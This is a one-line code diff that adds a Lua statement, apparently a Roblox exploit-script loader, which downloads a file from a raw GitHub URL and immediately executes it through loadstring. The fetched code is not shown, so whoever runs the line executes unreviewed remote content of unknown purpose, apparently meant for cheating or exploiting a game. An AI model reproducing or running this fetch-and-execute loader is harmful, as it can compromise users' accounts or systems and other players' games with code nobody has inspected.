@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/C00lHamoot/hi/d2b4df3c9e6f02d57bb6a9e1fd717cd03dd01472/copyezskid%20ok"))()
